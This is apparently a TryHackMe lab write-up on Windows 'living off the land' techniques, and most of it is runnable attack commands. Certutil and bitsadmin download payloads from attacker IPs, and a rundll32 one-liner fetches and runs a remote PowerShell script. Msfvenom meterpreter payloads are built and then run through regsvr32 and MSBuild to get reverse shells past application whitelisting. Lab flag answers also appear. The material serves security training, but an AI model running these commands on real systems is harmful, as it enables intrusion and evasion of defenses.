# Living Off The Land - Medium

1. [Windows Sysinternals](#windows-sysinternals)
2. [LOLBAS Project](#lolbas-project)
3. [File Operations](#file-operations)
4. [File Execution](#file-execution)
5. [Application Whitelisting Bypasses](#application-whitelisting-bypasses)
6. [Other Techniques](#other-techniques)

## Windows Sysinternals

* Living Off The Land - ideology of using Microsoft-signed programs, scripts & libraries to blend in and evade defensive controls.

* Windows Sysinternals - set of tools & advanced system utilities to manage, troubleshoot & diagnose Windows system.

* Categories in Sysinternals Suite include:

  * Disk management
  * Process management
  * Networking tools
  * System information
  * Security tools

* To use Windows Sysinternals tools, we need to accept Microsoft license agreement by passing ```-accepteula``` argument in command prompt.

* Sysinternals Live allows one to use the Sysinternals suite without installation; in File Explorer, we can access it by using the path ```\\live.sysinternals.com\tools```.

## LOLBAS Project

* [LOLBAS](https://lolbas-project.github.io/) (Living Off The Land Binaries and Scripts) - project to gather & document Microsoft built-in tools used for Living Off The Land techniques.

```markdown
1. Using the search bar, find the ATT&CK ID: T1040. What is the binary's name? - Pktmon.exe

2. Use the search bar to find more information about MSbuild.exe. What is the ATT&CK ID? - T1127.001

3. Use the search bar to find more information about Scriptrunner.exe. What is the function of the binary? - Execute
```

## File Operations

* certutil - Windows utility for handling certification services; however it is used for ingress tool transfer and obfuscation.

```shell
certutil -urlcache -split -f http://10.10.15.16/payload.exe C:\Windows\Temp\payload.exe
```

* BITSAdmin - tool to create, download, upload Background Intelligent Transfer Services (BITS); red team operators use it to download & execute malicious payload in compromised machine.

```shell
bitsadmin.exe /transfer /download /priority Foreground http://10.10.15.16/payload.exe C:\Users\thm\Desktop\payload.exe
```

* FindStr - to find text & string patterns in files; or to download remote files from SMB shared folders within network.

```shell
findstr /V dummystring \\Machine\sharedfolder\test.exe > C:\Windows\Temp\test.exe
```

```shell
#according to given task
bitsadmin.exe /transfer /download /priority Foreground http://tryhackme.com/robots.txt C:\Users\thm\Desktop\robots.txt

#decode the flag file
certutil -decode enc_thm_0YmFiOG_file.txt payload.txt
```

```markdown
1. What is the file name? - enc_thm_0YmFiOG_file.txt

2. What is the file content? - THM{ea4e2b9f362320d098635d4bab8a568e}
```

## File Execution

* File Explorer - file manager and system component; can help in Indirect Command Execution.

```shell
explorer.exe /root,"C:\Windows\System32\calc.exe"
```

* WMIC - Windows Management Instrumentation (WMIC) manages Windows components; can execute binaries too.

```shell
wmic.exe process call create calc
```

* Rundll32 - loads & runs DLL files within the system; can be leveraged to run payloads and execute scripts.

```shell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
#embeds a JS component, eval() to execute calc.exe binary

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
#for PowerShell scripts
```

## Application Whitelisting Bypasses

* Regsvr32 - command-line tool to register/unregister DLLs in Windows Registry; it can also be used to execute arbitrary binaries & bypass Windows Application Whitelisting.

```shell
#on attacker machine
#create malicious DLL and setup listener
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 10.10.15.16

set LPORT 443

exploit

#now deliver the payload DLL to victim machine
python3 -m http.server 1337
```

```shell
#on victim machine
certutil -urlcache -split -f http://10.10.15.16:1337/live0fftheland.dll C:\Users\thm\Downloads\live0fftheland.dll

#then we need to execute DLL using regsvr32.exe
c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
#we receive reverse shell on attacker machine
```

* Bash - bash.exe is for interacting with Linux and is a part of WSL (Windows Subsystem for Linux); bash.exe can be used to execute payloads and bypass app whitelisting.

```shell
bash.exe -c "C:\Users\thm\payload.exe"
#using this we can execute any unsigned payload
```

## Other Techniques

* Shortcuts - symbolic links; can be modified to gain initial access, privesc or persistence by setting target section to execute arbitrary files.

* No PowerShell - running PowerShell code without spawning PowerShell; this can be done with the help of tools such as PowerLessShell.

```shell
#on attacker machine
#clone the PowerLessShell repo
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git

#generate PowerShell payload
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.11.85.177 LPORT=4444 -f psh-reflection > liv0ff.ps1

#run metasploit framework to listen and wait for reverse shell
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set LHOST 10.11.85.177; set LPORT 4444; exploit"

#in new tab, go to PowerShellLess directory
#and convert payload to be compatible with msbuild
python2 PowerLessShell.py -type powershell -source ~/liv0ff.ps1 -output ~/liv0ff.csproj

#now we need to transfer output file to victim machine
python3 -m http.server 1337


#on victim Windows machine
certutil -urlcache -split -f http://10.11.85.177:1337/liv0ff.csproj liv0ff.csproj

#build .csproj file and get reverse shell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\thm\Desktop\liv0ff.csproj
```

```markdown
1. What is the content of the flag file? - THM{23005dc4369a0eef728aa39ff8cc3be2}
```
